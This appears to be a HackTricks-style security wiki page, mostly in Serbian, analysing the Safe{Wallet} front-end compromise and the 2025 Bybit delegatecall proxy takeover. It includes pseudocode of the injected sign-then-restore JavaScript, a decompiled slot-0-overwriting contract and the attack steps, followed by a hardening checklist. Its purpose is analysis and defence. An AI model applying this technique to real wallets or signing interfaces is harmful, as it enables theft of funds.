# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Kampanja krađe cold-wallet uređaja kombinovala je **supply-chain compromise of the Safe{Wallet} web UI** sa **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**. Ključne poente su:

- Ako dApp može da ubaci kod u signing path, može naterati signer-a da proizvede validan **EIP-712 signature over attacker-chosen fields** dok vraća originalne UI podatke tako da ostali signeri ostanu neupućeni.
- Safe proxies čuvaju `masterCopy` (implementation) na **storage slot 0**. Delegatecall ka ugovoru koji piše u slot 0 efektivno „nadograđuje“ Safe na attacker logic, dajući potpunu kontrolu nad wallet-om.

## Off-chain: Targeted signing mutation in Safe{Wallet}

Izmenjeni Safe bundle (`_app-*.js`) selektivno je napadao određene Safe + signer adrese. Ubaćena logika se izvršavala neposredno pre signing poziva:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Svojstva napada
- **Context-gated**: hard-coded allowlists za victim Safes/signers sprečavale su šum i smanjivale mogućnost detekcije.
- **Last-moment mutation**: polja (`to`, `data`, `operation`, gas) su bila prepisana neposredno pre `signTransaction`, a zatim vraćena, tako da su payload-ovi predloga u UI izgledali benigno dok su potpisi odgovarali payload-u napadača.
- **EIP-712 opacity**: wallets su prikazivali strukturirane podatke ali nisu dekodirali ugnježdeni calldata niti isticali `operation = delegatecall`, što je dovodilo do toga da je mutirana poruka u praksi potpisana na slepo.

### Relevancija validacije Gateway-a
Safe proposals se podnose na **Safe Client Gateway**. Pre uvođenja ojačanih provera, gateway je mogao prihvatiti predlog gde `safeTxHash`/signature korespondira sa drugim poljima nego JSON body ako je UI prepisao ta polja nakon potpisivanja. Nakon incidenta, gateway sada odbija predloge čiji hash/signature ne odgovaraju podnetoj transakciji. Slična serverska verifikacija hasha treba biti sprovedena za svaki signing-orchestration API.

### 2025 Bybit/Safe istaknuto
- The February 21, 2025 Bybit cold-wallet drain (~401k ETH) je ponovio isti pattern: kompromitovan Safe S3 bundle je bio okidač samo za Bybit signere i zamenio je `operation=0` → `1`, pokazujući `to` na pre-deploy-ovani attacker contract koji upisuje slot 0.
- Wayback-cached `_app-52c9031bfa03da47.js` prikazuje logiku koja je ključirana na Bybit’s Safe (`0x1db9…cf4`) i adrese signera, a zatim je odmah vraćena na čisti bundle dva minuta nakon izvršenja, što odražava trik “mutate → sign → restore”.
- Malicious contract (npr. `0x9622…c7242`) je sadržao jednostavne funkcije `sweepETH/sweepERC20` plus `transfer(address,uint256)` koja upisuje implementation slot. Izvršenje `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` pomerilo je proxy implementation i obezbedilo potpunu kontrolu.

## Na lancu: Delegatecall proxy takeover via slot collision

Safe proxies čuvaju `masterCopy` na **storage slot 0** i delegiraju svu logiku njemu. Pošto Safe podržava **`operation = 1` (delegatecall)**, svaka potpisana transakcija može ukazivati na proizvoljan contract i izvršavati njegov kod u storage kontekstu proxya.

Maliciozni contract je imitirao ERC-20 `transfer(address,uint256)` ali je umesto toga upisivao `_to` u slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Žrtve potpisuju `execTransaction` sa `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe `masterCopy` verifikuje potpise nad ovim parametrima.
3. Proxy izvršava delegatecall u `attackerContract`; telo `transfer` upisuje slot 0.
4. Slot 0 (`masterCopy`) sada pokazuje na logiku pod kontrolom napadača → **potpuno preuzimanje wallet-a i isisavanje sredstava**.

### Guard & version notes (post-incident hardening)
- Safes >= v1.3.0 mogu instalirati **Guard** koji može vetovati `delegatecall` ili primenjivati ACLs na `to`/selektore; Bybit je pokretao v1.1.1, pa Guard hook nije postojao. Nadogradnja kontrakata (i ponovno dodavanje owners) je potrebna da biste dobili ovaj control plane.

## Detection & hardening checklist

- **UI integrity**: pinujte JS assets / SRI; monitorujte bundle diffs; tretirajte signing UI kao deo trust boundary-a.
- **Sign-time validation**: hardware wallets sa **EIP-712 clear-signing**; eksplicitno prikažite `operation` i dekodirajte ugnježdeni calldata. Odbijte potpisivanje kada je `operation = 1` osim ako politika to ne dozvoljava.
- **Server-side hash checks**: gateways/services koji prosleđuju predloge moraju ponovo izračunati `safeTxHash` i verifikovati da potpisi odgovaraju poslatim poljima.
- **Policy/allowlists**: preflight pravila za `to`, selektore, tipove asset-a, i zabrana `delegatecall` osim za provere/odobrene tokove. Zahtevajte interni policy servis pre emitovanja potpuno potpisanih transakcija.
- **Contract design**: izbegavajte izlaganje proizvoljnog `delegatecall` u multisig/treasury wallets osim ako nije apsolutno neophodno. Postavite pokazivače za upgrade van slota 0 ili ih zaštitite eksplicitnom logikom za upgrade i kontrolom pristupa.
- **Monitoring**: podesite alert pri izvršenjima `delegatecall` iz wallet-a koji drže treasury funds, i na predloge koji menjaju `operation` iz uobičajenih `call` obrazaca.

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
